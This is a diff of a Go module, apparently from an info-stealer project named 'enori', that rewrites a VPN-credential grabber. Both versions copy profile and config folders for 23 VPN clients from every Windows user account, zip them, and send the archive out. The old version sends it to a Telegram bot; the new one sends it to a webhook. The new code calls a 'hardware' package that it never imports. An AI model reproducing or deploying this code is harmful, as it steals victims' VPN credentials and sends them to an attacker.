@@ -1,91 +1,86 @@
 package vpn
 
 import (
-    "fmt"
-    "os"
-    "path/filepath"
-    "strings"
+	"fmt"
+	"os"
+	"path/filepath"
+	"strings"
 
-    "github.com/mmmhlecaca/enori/common"
-    "github.com/mmmhlecaca/enori/utils/fileutil"
-    "github.com/mmmhlecaca/enori/utils/requests"
+	"github.com/mmmhlecaca/enori/utils/fileutil"
+	"github.com/mmmhlecaca/enori/utils/requests"
 )
 
-func Run(botToken, chatId string) {
-    vpnPaths := map[string]string{
-        "OpenVPN Connect":         "AppData\\Roaming\\OpenVPN Connect\\profiles",
-        "Mullvad VPN":             "AppData\\Roaming\\Mullvad VPN",
-        "Proton VPN":              "AppData\\Local\\ProtonVPN",
-        "Nord VPN":                "AppData\\Local\\NordVPN",
-        "Express VPN":             "AppData\\Local\\ExpressVPN",
-        "CyberGhost":              "AppData\\Local\\CyberGhost",
-        "Surfshark":               "AppData\\Local\\Surfshark",
-        "Vypr VPN":                "AppData\\Local\\VyprVPN",
-        "Windscribe":              "AppData\\Local\\Windscribe",
-        "Hide.me":                 "AppData\\Local\\hide.me VPN",
-        "Hotspot Shield":          "AppData\\Local\\Hotspot Shield",
-        "TunnelBear":              "AppData\\Local\\TunnelBear",
-        "IPVanish":                "AppData\\Local\\IPVanish",
-        "HMA":                     "AppData\\Local\\HMA VPN",
-        "ZenMate":                 "AppData\\Local\\ZenMate",
-        "Pure VPN":                "AppData\\Local\\PureVPN",
-        "TorGuard":                "AppData\\Local\\TorGuard",
-        "Betternet":               "AppData\\Local\\Betternet",
-        "PrivateVPN":              "AppData\\Local\\PrivateVPN",
-        "VPN Unlimited":           "AppData\\Local\\VPN Unlimited",
-        "Goose VPN":               "AppData\\Local\\GooseVPN",
-        "SaferVPN":                "AppData\\Local\\SaferVPN",
-        "Private Internet Access": "AppData\\Local\\Private Internet Access",
-    }
+func Run(webhook string) {
+	for _, user := range hardware.GetUsers() {
+		paths := map[string]string{
+			"OpenVPN Connect":         filepath.Join(user, "AppData", "Roaming", "OpenVPN Connect", "profiles"),
+			"Mullvad VPN":             filepath.Join(user, "AppData", "Roaming", "Mullvad VPN"),
+			"Proton VPN":              filepath.Join(user, "AppData", "Local", "ProtonVPN"),
+			"Nord VPN":                filepath.Join(user, "AppData", "Local", "NordVPN"),
+			"Express VPN":             filepath.Join(user, "AppData", "Local", "ExpressVPN"),
+			"CyberGhost":              filepath.Join(user, "AppData", "Local", "CyberGhost"),
+			"Surfshark":               filepath.Join(user, "AppData", "Local", "Surfshark"),
+			"Vypr VPN":                filepath.Join(user, "AppData", "Local", "VyprVPN"),
+			"Windscribe":              filepath.Join(user, "AppData", "Local", "Windscribe"),
+			"Hide.me":                 filepath.Join(user, "AppData", "Local", "hide.me VPN"),
+			"Hotspot Shield":          filepath.Join(user, "AppData", "Local", "Hotspot Shield"),
+			"TunnelBear":              filepath.Join(user, "AppData", "Local", "TunnelBear"),
+			"IPVanish":                filepath.Join(user, "AppData", "Local", "IPVanish"),
+			"HMA":                     filepath.Join(user, "AppData", "Local", "HMA VPN"),
+			"ZenMate":                 filepath.Join(user, "AppData", "Local", "ZenMate"),
+			"Pure VPN":                filepath.Join(user, "AppData", "Local", "PureVPN"),
+			"TorGuard":                filepath.Join(user, "AppData", "Local", "TorGuard"),
+			"Betternet":               filepath.Join(user, "AppData", "Local", "Betternet"),
+			"PrivateVPN":              filepath.Join(user, "AppData", "Local", "PrivateVPN"),
+			"VPN Unlimited":           filepath.Join(user, "AppData", "Local", "VPN Unlimited"),
+			"Goose VPN":               filepath.Join(user, "AppData", "Local", "GooseVPN"),
+			"SaferVPN":                filepath.Join(user, "AppData", "Local", "SaferVPN"),
+			"Private Internet Access": filepath.Join(user, "AppData", "Local", "Private Internet Access"),
+		}
 
-    vpnsTempDir := filepath.Join(os.TempDir(), "vpns-temp")
-    if err := os.MkdirAll(vpnsTempDir, os.ModePerm); err != nil {
-        fmt.Println("Error creating temp dir:", err)
-        return
-    }
+		tempDir := filepath.Join(os.TempDir(), fmt.Sprintf("vpn-%s", strings.Split(user, "\\")[2]))
+		found := ""
 
-    var vpnsFound strings.Builder
+		for name, path := range paths {
+			if !fileutil.Exists(path) || !fileutil.IsDir(path) {
+				continue
+			}
 
-    for _, user := range common.GetUsers() {
-        for name, relativePath := range vpnPaths {
-            rel := filepath.FromSlash(strings.ReplaceAll(relativePath, "\\", "/"))
-            vpnsPath := filepath.Join(user, rel)
+			dest := filepath.Join(tempDir, strings.Split(user, "\\")[2], name)
+			if err := os.MkdirAll(dest, os.ModePerm); err != nil {
+				continue
+			}
 
-            if !fileutil.Exists(vpnsPath) || !fileutil.IsDir(vpnsPath) {
-                continue
-            }
+			err := fileutil.CopyDir(path, dest)
+			if err != nil {
+				continue
+			}
 
-            vpnsDestPath := filepath.Join(vpnsTempDir, filepath.Base(user), name)
-            if err := os.MkdirAll(filepath.Dir(vpnsDestPath), os.ModePerm); err != nil {
-                continue
-            }
+			if !strings.Contains(found, name) {
+				found += fmt.Sprintf("\n✅ %s ", name)
+			}
+		}
 
-            if err := fileutil.CopyDir(vpnsPath, vpnsDestPath); err == nil {
-                vpnsFound.WriteString(fmt.Sprintf("\n✅ %s - %s", filepath.Base(user), name))
-            }
-        }
-    }
+		if found == "" {
+			os.RemoveAll(tempDir)
+			continue
+		}
 
-    if vpnsFound.Len() == 0 {
-        return
-    }
+		tempZip := filepath.Join(os.TempDir(), "vpn.zip")
+		if err := fileutil.Zip(tempDir, tempZip); err != nil {
+			os.RemoveAll(tempDir)
+			continue
+		}
+		requests.Webhook(webhook, map[string]interface{}{
+			"embeds": []map[string]interface{}{
+				{
+					"title":       "VPNs",
+					"description": "```" + found + "```",
+				},
+			},
+		}, tempZip)
 
-    vpnsFoundStr := vpnsFound.String()
-    if len(vpnsFoundStr) > 4090 {
-        vpnsFoundStr = "Numerous vpns to explore."
-    }
-
-    vpnsTempZip := filepath.Join(os.TempDir(), "vpns.zip")
-    _ = os.Remove(vpnsTempZip)
-    defer func() { _ = os.Remove(vpnsTempZip) }()
-
-    password := common.RandString(16)
-    if err := fileutil.ZipWithPassword(vpnsTempDir, vpnsTempZip, password); err != nil {
-        fmt.Println("Error zipping directory:", err)
-        return
-    }
-
-    message := fmt.Sprintf("Password: %s\nFounds: %s", password, vpnsFoundStr)
-    requests.Upload(botToken, chatId, vpnsTempZip)
-    requests.Upload(botToken, chatId, message)
+		os.RemoveAll(tempDir)
+		os.Remove(tempZip)
+	}
 }
